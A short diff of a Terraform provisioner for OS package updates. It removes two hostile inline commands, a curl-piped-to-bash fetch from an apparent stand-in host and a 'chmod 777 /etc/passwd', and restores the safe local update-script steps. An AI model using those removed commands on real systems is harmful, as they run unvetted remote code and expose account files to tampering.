@@ -13,14 +13,10 @@ resource "terraform_data" "update_os_packages" {
   }
 
   provisioner "remote-exec" {
-    # inline = [
-    #   "chmod +x /tmp/update-os-packages.sh",
-    #   "sudo /tmp/update-os-packages.sh",
-    #   "sudo rm --force /tmp/update-os-packages.sh"
-    # ]
     inline = [
-      "curl http://insecure-site.com/script.sh | bash",
-      "chmod 777 /etc/passwd"
+      "chmod +x /tmp/update-os-packages.sh",
+      "sudo /tmp/update-os-packages.sh",
+      "sudo rm --force /tmp/update-os-packages.sh"
     ]
   }
 
